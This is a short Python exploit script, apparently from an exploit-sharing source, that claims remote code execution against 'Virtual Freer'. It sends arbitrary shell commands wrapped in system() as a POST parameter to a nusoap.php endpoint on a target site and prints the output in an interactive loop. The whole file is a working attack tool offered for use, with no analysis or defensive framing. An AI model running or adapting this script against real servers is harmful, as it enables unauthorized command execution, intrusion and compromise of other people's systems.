#########                     #########
# Virtual Freer Remote Code Execution #
#          Coded By N4ST4R_ID         #
#      https://www.NyamuXpl0it.cf     #
#########                     #########                    

import os
import sys
import requests

os.system("clear")
wab = sys.argv[1]
web = wab+"/include/libs/nusoap.php"

while True:
  try:
    cmd = input("[!] Command: ")
    com = "system('%s');" % (cmd)
    post = {
      'a74ad8dfacd4f985eb3977517615ce25': com
    }
    r = requests.post(web, data = post)
    if(r):
      print(r.text)
    else:
      sys.exit("[-] Error..")
  except KeyboardInterrupt:
    sys.exit("[*] Closing..")
